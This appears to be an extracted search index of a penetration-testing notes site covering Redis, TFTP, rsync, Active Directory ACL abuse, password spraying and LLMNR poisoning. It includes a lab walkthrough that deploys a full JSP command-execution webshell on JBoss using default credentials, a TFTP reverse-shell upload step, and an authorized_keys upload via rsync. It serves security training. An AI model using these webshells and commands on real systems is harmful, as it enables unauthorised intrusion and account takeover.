redis","text":"","tags":["redis","port 6379"]},{"location":"6379-redis/#description","title":"Description","text":"<p>Redis (REmote DIctionary Server) is an open-source advanced NoSQL key-value data store used as a database, cache, and message broker. The Redis command line interface (redis-cli) is a terminal program used to send commands to and read replies from the Redis server. Redis popularized the idea of a system that can be considered a store and a cache at the same time.Redis is an open-source, in-memory key-value data store. Whether you\u2019ve installed Redis locally or you\u2019re working with a remote instance, you need to connect to it in order to perform most operations.</p>","tags":["redis","port 6379"]},{"location":"6379-redis/#the-server","title":"The server","text":"<p>Redis runs as server-side software so its core functionality is in its server component. The server listens for connections from clients, programmatically or through the command-line interface.</p>","tags":["redis","port 6379"]},{"location":"6379-redis/#the-cli","title":"The CLI","text":"<p>The command-line interface (CLI) is a powerful tool that gives you complete access to Redis\u2019s data and its functionalities if you are developing a software or tool that needs to interact with it.</p>","tags":["redis","port 6379"]},{"location":"6379-redis/#database","title":"Database","text":"<p>The database is stored in the server's RAM to enable fast data access. Redis also writes the contents of the database to disk at varying intervals to persist it as a backup, in case of failure.</p>","tags":["redis","port 6379"]},{"location":"6379-redis/#install-redis-in-your-kali","title":"Install redis in your kali","text":"","tags":["redis","port 6379"]},{"location":"6379-redis/#prerequisites","title":"Prerequisites","text":"<p>If you're running a very minimal distribution (such as a Docker container) you may need to install lsb-release first:</p> <pre><code>sudo apt install lsb-release\n</code></pre> <p>Add the repository to the apt index, update it, and then install:</p> <pre><code>curl -fsSL https://packages.redis.io/gpg | sudo gpg --dearmor -o /usr/share/keyrings/redis-archive-keyring.gpg\n\necho \"deb [signed-by=/usr/share/keyrings/redis-archive-keyring.gpg] https://packages.redis.io/deb $(lsb_release -cs) main\" | sudo tee /etc/apt/sources.list.d/redis.list\n\nsudo apt-get update\n\nsudo apt-get install redis\n</code></pre>","tags":["redis","port 6379"]},{"location":"6379-redis/#to-connect-to-a-terminal","title":"To connect to a terminal","text":"<p>First thing to know is that you can use \u201ctelnet\u201d (usually on Redis default port 6379)</p> <pre><code>telnet localhost 6379\n</code></pre> <p>If you have redis-server installed locally, you can connect to the Redis instance with the redis-cli command.</p> <p>If you want to connect to a remote Redis datastore, you can specify its host and port numbers with the -h and -p flags, respectively. Also, if you\u2019ve configured your Redis database to require a password, you can include the -a flag followed by your password in order to authenticate:</p> <pre><code>redis-cli -h host -p port_number -a password\n</code></pre> <p>If you\u2019ve set a Redis password, clients will be able to connect to Redis even if they don\u2019t include the -a flag in their redis-cli command. However, they won\u2019t be able to add, change, or query data until they authenticate. To authenticate after connecting, use the auth command followed by the password:</p> <pre><code>auth password\n</code></pre> <p>If the password passed to auth is valid, the command will return OK. Otherwise, it will return an error.</p> <pre><code>redis-cli -h 10.129.124.88\n</code></pre> <p>Upon a successful connection with the Redis server, we should be able to see a prompt in the terminal as:</p> <pre><code>IP:6379&gt;\n</code></pre> <p>One of the basic Redis enumeration commands is info which returns information and statistics about the Redis server. </p>","tags":["redis","port 6379"]},{"location":"6379-redis/#dumping-database","title":"Dumping Database","text":"<p>Inside Redis the databases are numbers starting from 0. You can find if anyone is used in the output of the command info inside the \"Keyspace\" chunk:</p> <pre><code># Keyspace\ndb0:keys=4, expires=0, avg_ttl=0\ndb1:keys=2, expires=0, avg_ttl=0\n</code></pre> <p>Or you can just get all the keyspaces (databases) with:</p> <pre><code>INFO keyspace\n</code></pre> <p>Redis has a concept of separated namespaces called \u201cdatabases\u201d. You can select the database number you want to use with \u201cSELECT\u201d. By default the database with index 0 is used. </p> <pre><code># Select database\nredis 127.0.0.1:6379&gt; SELECT 1\n\n# To see all keys in a given database. First, you enter in it with \"SELECT &lt;number&gt;\" and then\nredis 127.0.0.1:6379&gt; keys *\n\n# To retrieve a specific key\nredis 127.0.0.1:6379&gt; get flag\n</code></pre>","tags":["redis","port 6379"]},{"location":"6653-openflow/","title":"6653 Openflow","text":"<p>The OpenFlow protocol operates over TCP, with a  default port number of 6653. This protocol operates between an SDN controller and an SDN-controlled switch or other device implementing the OpenFlow API.</p>","tags":["Openflow","port 6653"]},{"location":"69-tftp/","title":"69 - ftpt","text":"<p>Trivial File Transfer Protocol (TFTP) uses UDP port 69 and requires no authentication\u2014clients read from, and write to servers using the datagram format outlined in RFC 1350. Due to deficiencies within the protocol (namely lack of authentication and no transport security), it is uncommon to find servers on the public Internet. Within large internal networks, however, TFTP is used to serve configuration files and ROM images to VoIP handsets and other devices.</p> <p>You can spot the open port after running a UDP scan. But also, when reading /etc/passwd, you might find service/user tftp. </p> <p>Trivial File Transfer Protocol (TFTP) is a simple protocol that provides basic file transfer function with no user authentication. TFTP is intended for applications that do not need the sophisticated interactions that File Transfer Protocol (FTP) provides. </p> <p>UDP provides a mechanism to detect corrupt data in packets, but it does not attempt to solve other problems that arise with packets, such as lost or out of order packets. It is implemented in the transport layer of the OSI Model, known as a fast but not reliable protocol, unlike TCP, which is reliable, but slower then UDP. Just like how TCP contains open ports for protocols such as HTTP, FTP, SSH and etcetera, the same way UDP has ports for protocols that work for UDP.</p>","tags":["pentesting"]},{"location":"69-tftp/#enumeration","title":"Enumeration","text":"<pre><code>nmap -n -Pn -sU -p69 -sV --script tftp-enum $ip\n</code></pre>","tags":["pentesting"]},{"location":"69-tftp/#exploitation","title":"Exploitation","text":"<p>You can use Metasploit or Python to check if you can download/upload files:</p> <p>Module: <code>auxiliary/admin/tftp/tftp_transfer_util</code></p> <p>Also you can exploit manually. Install tftp client:</p> <pre><code># Installing a tftp server\nsudo apt-get install tftpd-hpa\n\n# Installing a tftp client\nsudo apt install tftp\n</code></pre> <p>For available commands: </p> <pre><code>man tftp\n</code></pre> <p>Upload your pentesmonkey shell with:</p> <pre><code>put pentesmonkey.php\n</code></pre> <p>Where does it get uploaded? Depends. But The default configuration file for tftpd-hpa is /etc/default/tftpd-hpa. The directory is configured there under the parameter <code>TFTP_DIRECTORY=</code> With that information, you can access the directory and from there launch your reverse shell. </p>","tags":["pentesting"]},{"location":"69-tftp/#related-labs","title":"Related labs","text":"<p>HackTheBox machine: included.</p>","tags":["pentesting"]},{"location":"7z/","title":"7z","text":""},{"location":"7z/#installation","title":"Installation","text":"<pre><code>sudo apt install p7zip-full\n</code></pre>"},{"location":"7z/#basic-usage","title":"Basic usage","text":"<pre><code># Extract file\n7z x ~/archive.7z\n\n# a : Add files to archive\n# b : Benchmark\n# d : Delete files from archive\n# e : Extract files from archive (without using directory names)\n# h : Calculate hash values for files\n# i : Show information about supported formats\n# l : List contents of archive\n# rn : Rename files in archive\n# t : Test integrity of archive\n# u : Update files to archive\n# x : eXtract files with full paths\n</code></pre>"},{"location":"8080-jboss/","title":"8080 JBoss AS Instance 6.1.0","text":"<p>Copied from INE lab:  HTML Adapter to Root</p> <p>Step 1:\u00a0Open the lab link to access the Kali GUI instance.</p> <p></p> <p>Step 2:\u00a0Check if the provided machine/domain is reachable.</p> <p>Command:</p> <pre><code>ping -c3 demo.ine.local\n</code></pre> <p></p> <p>The provided machine is reachable.</p> <p>Step 3:\u00a0Check open ports on the provided machine.</p> <p>Command:</p> <pre><code>nmap -sS -sV demo.ine.local\n</code></pre> <p></p> <p></p> <p></p> <p>Multiple ports are open on the target machine.</p> <p>Some notable services include Java RMI, Apache Tomcat, and the JBoss application server.</p> <p>What is Java RMI?</p> <p>The Java Remote Method Invocation (RMI) system allows an object running in one Java virtual machine to invoke methods on an object running in another Java virtual machine. RMI provides for remote communication between programs written in the Java programming language.</p> <p>Reference:\u00a0https://docs.oracle.com/javase/tutorial/rmi/index.html</p> <p>What is Apache Tomcat?</p> <p>Apache Tomcat is a free and open-source implementation of the Jakarta Servlet, Jakarta Expression Language, and WebSocket technologies. It provides a \"pure Java\" HTTP web server environment in which Java code can run.</p> <p>Reference:\u00a0https://en.wikipedia.org/wiki/Apache_Tomcat</p> <p>What is JBoss application server?</p> <p>JBoss application server is an open-source platform, developed by Red Hat, used for implementing Java applications and a wide variety of other software applications. You can build and deploy Java services to be scaled to fit the size of your business.</p> <p>Reference:\u00a0https://www.dnsstuff.com/what-is-jboss-application-server</p> <p>Step 4:\u00a0Check the application served by Apache Tomcat.</p> <p>Open the following URL in the browser:</p> <p>URL:\u00a0http://demo.ine.local:8080</p> <p></p> <p>Notice that the target is serving the JBoss application server (version 6.1.0).</p> <p>Step 5:\u00a0Access the JMX console.</p> <p>Click on the\u00a0JMX Console\u00a0link:</p> <p></p> <p>What is JMX?</p> <p>Java Management Extensions (JMX) is a Java technology that supplies tools for managing and monitoring applications, system objects, devices (such as printers) and service-oriented networks. Those resources are represented by objects called MBeans (for Managed Bean).</p> <p>Reference:\u00a0https://en.wikipedia.org/wiki/Java_Management_Extensions</p> <p>Using the JMX console, we can manage the application and, therefore, alter it to execute malicious code on the target server and gain remote code execution.</p> <p>What is an MBean?</p> <p>An MBean is a managed Java object, similar to a JavaBeans component, that follows the design patterns set forth in the JMX specification. An MBean can represent a device, an application, or any resource that needs to be managed.</p> <p>Reference:\u00a0https://docs.oracle.com/javase/tutorial/jmx/mbeans/index.html</p> <p>Once the JMX Console is clicked, you should be presented with an authentication dialog:</p> <p></p> <p>Searching online for the default credentials for JBoss:</p> <p></p> <p>Click on the\u00a0StackOverflow link\u00a0from the results:</p> <p></p> <p>The default credentials for JBoss web console are:</p> <p>Username:\u00a0admin Password:\u00a0admin</p> <p>Submit these credentials to the authentication dialog:</p> <p></p> <p>The above credentials were accepted, and the login was successful!</p> <p></p> <p>You should have access to the\u00a0JMX Agent View\u00a0page now.</p> <p>Using this page, one can manage the deployed applications and even alter them.</p> <p>Step 6:\u00a0Search for the\u00a0MainDeployer\u00a0(JBoss System API).</p> <p>Apply the following filter:</p> <p>Filter: </p> <pre><code>jboss.system*\n</code></pre> <p></p> <p>Select the entry for\u00a0MainDeployer.</p> <p></p> <p>Information:\u00a0The MainDeployer service can be used to manage deployments on the JBoss application server. For that reason, this API is quite crucial from a pentester's perspective.</p> <p>Once the\u00a0MainDeployer\u00a0service is selected, you should see the following page:</p> <p></p> <p>Scroll down to the\u00a0redeploy\u00a0attribute. Make sure the\u00a0redeploy\u00a0attribute accepts a URL as the input (java.net.URL):</p> <p></p> <p>We will be invoking this method to deploy a malicious JSP application, one that gives us a webshell.</p> <p>Step 7:\u00a0Prepare the payload for deployment.</p> <p>Head over to the following URL:</p> <p>URL:\u00a0https://github.com/fuzzdb-project/fuzzdb/blob/master/web-backdoors/jsp/cmd.jsp</p> <p></p> <p>Open the code in raw form (click the\u00a0Raw\u00a0button):</p> <p></p> <p>Copy the payload (press\u00a0<code>CTRL+SHIFT+ALT</code>) and save it as\u00a0backdoor.jsp:</p> <pre><code>&lt;%@ page import=\"java.util.*,java.io.*\"%&gt;\n&lt;%\n//\n// JSP_KIT\n//\n// cmd.jsp = Command Execution (unix)\n//\n// by: Unknown\n// modified: 27/06/2003\n//\n%&gt;\n&lt;HTML&gt;&lt;BODY&gt;\n&lt;FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"&gt;\n&lt;INPUT TYPE=\"text\" NAME=\"cmd\"&gt;\n&lt;INPUT TYPE=\"submit\" VALUE=\"Send\"&gt;\n&lt;/FORM&gt;\n&lt;pre&gt;\n&lt;%\nif (request.getParameter(\"cmd\") != null) {\n    out.println(\"Command: \" + request.getParameter(\"cmd\") + \"&lt;BR&gt;\");\n    Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));\n    OutputStream os = p.getOutputStream();\n    InputStream in = p.getInputStream();\n    DataInputStream dis = new DataInputStream(in);\n    String disr = dis.readLine();\n    while ( disr != null ) {\n        out.println(disr); \n        disr = dis.readLine(); \n        }\n    }\n%&gt;\n&lt;/pre&gt;\n&lt;/BODY&gt;&lt;/HTML&gt;\n</code></pre> <p></p> <p></p> <p>If the GET request contains the\u00a0<code>cmd</code>\u00a0parameter, the specified command is executed, and the results are displayed on the web page.</p> <p>Generate a WAR (Web Application Resource or Web application ARchive) file for deployment:</p> <p>Commands: </p> <pre><code>jar -cvf backdoor.war backdoor.jsp\nfile backdoor.war\n</code></pre> <p></p> <p>The payload application is generated.</p> <p>Step 8:\u00a0Deploy the payload application on the target server.</p> <p>Check the IP address of the attacker machine:</p> <p>Command: </p> <pre><code>ip addr\n</code></pre> <p></p> <p>The IP address of the attacker machine is\u00a0<code>192.166.140.2</code>.</p> <p>Note:\u00a0The IP addresses assigned to the labs are bound to change with every lab run. Kindly replace the IP addresses in the subsequent commands with the one assigned to your attacker machine. Failing to do that would result in failed exploitation attempts.</p> <p>Start a Python-based HTTP server to serve the payload application:</p> <p>Command: </p> <pre><code>python3 -m http.server 80\n</code></pre> <p></p> <p>Head over to the JMX Console page and under the\u00a0redeploy\u00a0attribute, place the following URL as the parameter:</p> <p>URL: </p> <pre><code>http://192.166.140.2/backdoor.war\n</code></pre> <p>Note:\u00a0Kindly make sure to substitute the correct IP address in the above URL.</p> <p></p> <p>Once the payload application URL is specified, click on the\u00a0Invoke\u00a0button:</p> <p></p> <p>The operation was successful, as shown in the above image!</p> <p>Check the terminal where the Python-based HTTP server was running:</p> <p></p> <p>Notice that there is a request from the target machine for the\u00a0<code>backdoor.war</code>\u00a0file.</p> <p>Step 9:\u00a0Access the webshell and run OS commands.</p> <p>Visit the following URL:</p> <p>URL: </p> <pre><code>http://demo.ine.local:8080/backdoor/backdoor.jsp\n</code></pre> <p></p> <p>There is a simple webshell.</p> <p>Send the\u00a0<code>id</code>\u00a0command:</p> <p></p> <p>We are running as\u00a0<code>root</code>!</p> <p>Send the\u00a0<code>pwd</code>\u00a0command:</p> <p></p> <p>List the files in the current directory (<code>ls -al</code>):</p> <p></p> <p>That was all for this lab on abusing a misconfigured JBoss application server to access the JMX console (default credentials) and leveraging it to deploy a webshell.</p> <p>To summarize, we performed recon on the target machine to determine the presence of JBoss AS. We found that the JMX console accepted default credentials and leveraged it to deploy a malicious application to execute arbitrary commands on the target server as root.</p>","tags":["jboss","port 8080"]},{"location":"873-rsync/","title":"Port 873 - rsync","text":"","tags":["rsync","port","873"]},{"location":"873-rsync/#description","title":"Description","text":"<p>rsync is a utility for efficiently transferring and synchronizing files between a computer and an external hard drive and across networked computers. It can be used to copy files locally on a given machine and to/from remote hosts. It is highly versatile and well-known for its delta-transfer algorithm. This algorithm reduces the amount of data transmitted over the network when a version of the file already exists on the destination host. It does this by sending only the differences between the source files and the older version of the files that reside on the destination server. It is often used for backups and mirroring. It finds files that need to be transferred by looking at files that have changed in size or the last modified time. By default, it uses port <code>873</code> and can be configured to use SSH for secure file transfers by piggybacking on top of an established SSH server connection. </p>","tags":["rsync","port","873"]},{"location":"873-rsync/#footprinting-rsync","title":"Footprinting rsync","text":"<pre><code>sudo nmap -sV -p 873 $ip\n</code></pre> <p>We can next probe the service a bit to see what we can gain access to:</p> <pre><code>nc -nv $ip 873\n</code></pre> <p>If some share is returned, we could go further by enumerating the share:</p> <pre><code>rsync -av --list-only rsync://$ip$/&lt;nameOfShare&gt;\n</code></pre> <p>nmap script to enumerate shares:</p> <pre><code>nmap -sV --script \"rsync-list-modules\" -p &lt;PORT&gt; $ip\n</code></pre> <p>metasploit module to enumerate shares</p> <pre><code>use auxiliary/scanner/rsync/modules_list\n</code></pre> <p>If IPv6 is in use:</p> <pre><code># Example using IPv6 and a different port\nrsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730\n</code></pre>","tags":["rsync","port","873"]},{"location":"873-rsync/#connect-to-the-service","title":"Connect to the service","text":"<pre><code>rsync rsync://IP\n</code></pre>","tags":["rsync","port","873"]},{"location":"873-rsync/#basic-rsync-commands","title":"Basic rsync commands","text":"<p>General syntax:</p> <pre><code>rsync [OPTION] ... [USER@]HOST::SRC [DEST]\n</code></pre> <pre><code># List content\nrsync IP::\n\n# List recursively a directory\nrsync -r IP::folder\n\n# Download a file from  the server to your machine\nrsync IP::folder/sourcefile.txt destinationfile.txt    \n\n# Downloa a folder\nrsync -r IP::folder/sourcefile.txt destinationfile.txt   \n</code></pre>","tags":["rsync","port","873"]},{"location":"873-rsync/#brute-force","title":"Brute force","text":"<p>Once you have the list of modules you have a few different options depending on the actions you want to take and whether or not authentication is required. If authentication is not required you can list a shared folder:</p> <pre><code>rsync -av --list-only rsync://$ip$/&lt;nameOfShared&gt;\n</code></pre> <p>And copy all files to your local machine via the following command:</p> <pre><code>rsync -av rsync://$ip:8730/&lt;nameOfShared&gt;./rsyn_shared\n</code></pre> <p>This recursively transfers all files from the directory <code>&lt;nameOfShared&gt;</code> on the machine $ip into the <code>./rsync_shared</code> directory on the local machine. The files are transferred in \"archive\" mode, which ensures that symbolic links, devices, attributes, permissions, ownerships, etc. are preserved in the transfer.</p> <p>If you have credentials you can list/download a shared name using (the password will be prompted):</p> <pre><code>rsync -av --list-only rsync://&lt;username&gt;@$ip/&lt;nameOfShared&gt;\nrsync -av \n\nrsync://&lt;username&gt;@$ip$:8730/&lt;nameOfShared&gt; ./rsyn_shared\n</code></pre> <p>You could also upload some content using rsync (for example, in this case we can upload an authorized_keys file to obtain access to the box):</p> <pre><code>rsync -av home_user/.ssh/ rsync://&lt;username&gt;@$ip/home_user/.ssh\n</code></pre>","tags":["rsync","port","873"]},{"location":"873-rsync/#transfer-files-with-rsync-over-ssh","title":"Transfer Files with Rsync over SSH","text":"<p>Before you can start transferring files and directories with rsync over SSH, make sure you can\u00a0use SSH to connect to a remote server. Once verified, you can begin backing up your data. Ensure your destination system has sufficient storage space.</p> <p>The syntax for copying files to a remote server over SSH with the\u00a0<code>rsync</code>\u00a0command is:</p> <pre><code>rsync OPTION SourceDirectory_or_filePath user@serverIP_or_name:Target\n\n# Example\nrsync ~/Desktop/Dir1/\"source pdf sample.pdf\" test@192.168.56.100:~/Desktop/test\n</code></pre>","tags":["rsync","port","873"]},{"location":"access-control-list/","title":"Access Control List (ACL)","text":"<p>An Access Control List (ACL) defines:</p> <ul> <li>who has access to which asset/resource and </li> <li>the level of access they are provisioned.</li> </ul> <p>There are two types of ACLs:</p> <ol> <li><code>Discretionary Access Control List</code>\u00a0(<code>DACL</code>) -defines which security principals are granted or denied access to an object. DACLs are made up of ACEs that either allow or deny access.</li> <li><code>System Access Control Lists</code>\u00a0(<code>SACL</code>) - allow administrators to log access attempts made to secured objects.</li> </ol> <p>If a DACL does not exist for an object, all who attempt to access the object are granted full rights. If a DACL exists, but does not have any ACE entries specifying specific security settings, the system will deny access to all users, groups, or processes attempting to access it.</p> <p>When access control lists are checked to determine permissions, they are checked from top to bottom until an access denied is found in the list.</p>","tags":["active","directory","ldap","linux"]},{"location":"access-control-list/#access-control-entries-aces","title":"Access Control Entries (ACEs)","text":"<p>An ACL is composed of Access Control Entries (ACEs). Each ACE maps back to a user, group, or process (also known as security principals) and defines the rights granted to that principal. </p> <p>There are\u00a0<code>three</code>\u00a0main types of ACEs that can be applied to all securable objects in AD:</p> ACE Description <code>Access denied ACE</code> Used within a DACL to show that a user or group is explicitly denied access to an object <code>Access allowed ACE</code> Used within a DACL to show that a user or group is explicitly granted access to an object <code>System audit ACE</code> Used within a SACL to generate audit logs when a user or group attempts to access an object. It records whether access was granted or not and what type of access occurred <p>Each ACE is made up of the following\u00a0<code>four</code>\u00a0components:</p> <ol> <li>The security identifier (SID) of the user/group that has access to the object (or principal name graphically)</li> <li>A flag denoting the type of ACE (access denied, allowed, or system audit ACE)</li> <li>A set of flags that specify whether or not child containers/objects can inherit the given ACE entry from the primary or parent object</li> <li>An\u00a0access mask\u00a0which is a 32-bit value that defines the rights granted to an object</li> </ol> <p>Some example Active Directory object security permissions are as follows. These can be enumerated (and visualized) using a tool such as BloodHound, and are all abusable with PowerView, among other tools:</p> <ul> <li><code>ForceChangePassword</code>\u00a0abused with\u00a0<code>Set-DomainUserPassword</code></li> <li><code>Add Members</code>\u00a0abused with\u00a0<code>Add-DomainGroupMember</code></li> <li><code>GenericAll</code>\u00a0abused with\u00a0<code>Set-DomainUserPassword</code>\u00a0or\u00a0<code>Add-DomainGroupMember</code></li> <li><code>GenericWrite</code>\u00a0abused with\u00a0<code>Set-DomainObject</code></li> <li><code>WriteOwner</code>\u00a0abused with\u00a0<code>Set-DomainObjectOwner</code></li> <li><code>WriteDACL</code>\u00a0abused with\u00a0<code>Add-DomainObjectACL</code></li> <li><code>AllExtendedRights</code>\u00a0abused with\u00a0<code>Set-DomainUserPassword</code>\u00a0or\u00a0<code>Add-DomainGroupMember</code></li> <li><code>Addself</code>\u00a0abused with\u00a0<code>Add-DomainGroupMember</code></li> </ul>","tags":["active","directory","ldap","linux"]},{"location":"access-control-list/#some-acl-attacks","title":"Some ACL attacks","text":"<ul> <li>ForceChangePassword\u00a0- gives us the right to reset a user's password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords).</li> <li>GenericWrite\u00a0- gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a Kerberoasting attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack which is outside the scope of this module.</li> <li><code>AddSelf</code>\u00a0- shows security groups that a user can add themselves to.</li> <li>GenericAll\u00a0- this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the\u00a0Local Administrator Password Solution (LAPS)\u00a0is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access.</li> </ul> <p>These are some common attack scenarios:</p> Attack Description <code>Abusing forgot password permissions</code> Help Desk and other IT users are often granted permissions to perform password resets and other privileged tasks. If we can take over an account with these privileges (or an account in a group that confers these privileges on its users), we may be able to perform a password reset for a more privileged account in the domain. <code>Abusing group membership management</code> It's also common to see Help Desk and other staff that have the right to add/remove users from a given group. It is always worth enumerating this further, as sometimes we may be able to add an account that we control into a privileged built-in AD group or a group that grants us some sort of interesting privilege. <code>Excessive user rights</code> We also commonly see user, computer, and group objects with excessive rights that a client is likely unaware of. This could occur after some sort of software install (Exchange, for example, adds many ACL changes into the environment at install time) or some kind of legacy or accidental configuration that gives a user unintended rights. Sometimes we may take over an account that was given certain rights out of convenience or to solve a nagging problem more quickly.","tags":["active","directory","ldap","linux"]},{"location":"acronyms/","title":"Acronyms","text":""},{"location":"acronyms/#a","title":"A","text":"Acronym Expression"},{"location":"acronyms/#b","title":"B","text":"Acronym Expression BFLA Broken Funtion Level Authorization BOLA Broken Access Level Authorization"},{"location":"acronyms/#c","title":"C","text":"Acronym Expression"},{"location":"acronyms/#d","title":"D","text":"Acronym Expression"},{"location":"acronyms/#e","title":"E","text":"Acronym Expression"},{"location":"acronyms/#f","title":"F","text":"Acronym Expression"},{"location":"acronyms/#g","title":"G","text":"Acronym Expression"},{"location":"acronyms/#h","title":"H","text":"Acronym Expression"},{"location":"acronyms/#i","title":"I","text":"Acronym Expression IGA Identity Governance and Administration ILM Identity Lifecycle Management"},{"location":"acronyms/#j","title":"J","text":"Acronym Expression"},{"location":"acronyms/#k","title":"K","text":"Acronym Expression"},{"location":"acronyms/#l","title":"L","text":"Acronym Expression"},{"location":"acronyms/#m","title":"M","text":"Acronym Expression"},{"location":"acronyms/#n","title":"N","text":"Acronym Expression"},{"location":"acronyms/#o","title":"O","text":"Acronym Expression OTP One Time Password"},{"location":"acronyms/#p","title":"P","text":"Acronym Expression"},{"location":"acronyms/#q","title":"Q","text":"Acronym Expression"},{"location":"acronyms/#r","title":"R","text":"Acronym Expression RBAC Role Based Access Control"},{"location":"acronyms/#s","title":"S","text":"Acronym Expression SOAP Simple Object Access Protocol SCIM System for Cross-domain Identity Management is a standard for automating the exchange of user identity information between service provider and identity providers. It helps with automating functions like provisioning or deprovisioning of users identities on applications integrated with the identity provider."},{"location":"acronyms/#t","title":"T","text":"Acronym Expression"},{"location":"acronyms/#u","title":"U","text":"Acronym Expression"},{"location":"acronyms/#v","title":"V","text":"Acronym Expression"},{"location":"acronyms/#w","title":"W","text":"Acronym Expression"},{"location":"acronyms/#x","title":"X","text":"Acronym Expression"},{"location":"acronyms/#y","title":"Y","text":"Acronym Expression"},{"location":"acronyms/#z","title":"Z","text":"Acronym Expression"},{"location":"active-directory-from-linux-attacks/","title":"Attacking Active Directory from Linux","text":"<p>Index of Active Directory</p> <p>Attacking from linux</p> <ul> <li>Enumerating Active Directory from Linux</li> <li>Attacking Active Directory from Linux</li> <li>Lateral Movement in Active Directory from Linux</li> <li>Privileges escalation in Active Directory from Linux</li> </ul> <p>Attacking from Windows</p> <ul> <li>Enumerating Active Directory from Windows</li> <li>Attacking Active Directory from Windows</li> <li>Privileges escalation in Active Directory from Windows</li> </ul>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-attacks/#password-spraying-attack","title":"Password spraying attack","text":"<p>Steps:</p> <ul> <li>Build a user list (with previous techniques)</li> <li>Consider your password list.</li> </ul> <p>From previous section we used kerbrute to build a userlist:</p> <pre><code>kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-attacks/#kerbrute","title":"kerbrute","text":"<pre><code>kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_ad_users  Welcome1\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-attacks/#rpcclient","title":"rpcclient","text":"<pre><code>for u in $(cat valid_ad_users);do rpcclient -U \"$u%Welcome1\" -c \"getusername;quit\" 172.16.5.5 | grep Authority; done\n</code></pre> <p>An important consideration is that a valid login is not immediately apparent with rpcclient, with the response Authority Name indicating a successful login. We can filter out invalid login attempts by grepping for Authority in the response. </p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-attacks/#crackmapexec","title":"crackmapexec","text":"<pre><code>sudo crackmapexec smb 172.16.5.5 -u valid_ad_users -p Password123 | grep +\n\n# Spraying password with crackmapexec\ncrackmapexec smb $ip/23 -u /folder/userlist.txt -u administrator -H 88ad09182de639ccc6579eb0849751cf --local-auth --continue-on-success | grep +\n# --continue-on-success:  continue spraying even after a valid password is found. Useful for spraying a single password against a large user list\n# --local-auth:  if we are targetting a non-domain joined computer, we will need to use the option --local-auth. The --local-auth flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout.\n# -H: hash\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-attacks/#llmnrnbt-ns-poisoning","title":"LLMNR/NBT-NS Poisoning","text":"<p>See more. </p> <p>Link-Local Multicast Name Resolution\u00a0(LLMNR) and\u00a0NetBIOS Name Service\u00a0(NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails.</p> <p>If a machine attempts to resolve a host but DNS resolution fails, typically, the machine will try to ask all other machines on the local network for the correct host address via LLMNR. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts.</p> <p>It uses port\u00a0<code>5355</code>\u00a0over UDP natively. If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name. NBT-NS utilizes port\u00a0<code>137</code>\u00a0over UDP.</p> <p>The kicker here is that when LLMNR/NBT-NS are used for name resolution, ANY host on the network can reply. This is where we come in with\u00a0<code>Responder</code>\u00a0to poison these requests.</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-attacks/#how-does-a-typical-attack-work","title":"How does a typical attack work","text":"<ol> <li>A host attempts to connect to the print server at \\print01.inlanefreight.local, but accidentally types in \\printer01.inlanefreight.local.</li> <li>The DNS server responds, stating that this host is unknown.</li> <li>The host then broadcasts out to the entire local network asking if anyone knows the location of \\printer01.inlanefreight.local.</li> <li>The attacker (us with\u00a0<code>Responder</code>\u00a0running) responds to the host stating that it is the \\printer01.inlanefreight.local that the host is looking for.</li> <li>The host believes this reply and sends an authentication request to the attacker with a username and NTLMv2 password hash.</li> <li>This hash can then be cracked offline or used in an SMB Relay attack if the right conditions exist.</li> </ol>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-attacks/#tools","title":"Tools","text":"<p>Several tools can be used to attempt LLMNR &amp; NBT-NS poisoning:</p> Tool Description Responder Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions. Inveigh Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks. Metasploit Metasploit has several built-in scanners and spoofing modules made to deal with poisoning attacks.","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-attacks/#responder","title":"Responder","text":"<p>Listening with responder</p> <pre><code>sudo responder -I ens224 -A -wf\n# sudo privileges or root to make sure that all ports needed are available on our attack host for it to function best.\n# -w: The use of the -w flag utilizes the built-in WPAD proxy server. This can be highly effective, especially in large organizations, because it will capture all HTTP requests by any users that launch Internet Explorer if the browser has Auto-detect settings enabled.\n# -f: attempts to fingerprint the remote host operating system and version.\n</code></pre> <p>With this configuration shown above, Responder will listen and answer any requests it sees on the wire.</p> <p>All saved Hashes are located in Responder's logs directory (<code>/usr/share/responder/logs/</code>). </p> <p>NetNTLMv2 hashes are very useful once cracked, but cannot be used for techniques such as pass-the-hash, meaning we have to attempt to crack them offline with hashcat or johntheripper. For example, in the case of a  NetNTLMv2 hash, we can copy the hash to a file and attempt to crack it using the hashcat module 5600. </p> <pre><code>hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt \n</code></pre> <p>See hashcat for other modules beside 5600.</p> <p>Hashes are also stored in a SQLite database that can be configured in the\u00a0<code>Responder.conf</code>\u00a0config file, typically located in\u00a0<code>/usr/share/responder</code>\u00a0unless we clone the Responder repo directly from GitHub.</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-linux-enumeration/","title":"Enumerating Active Directory 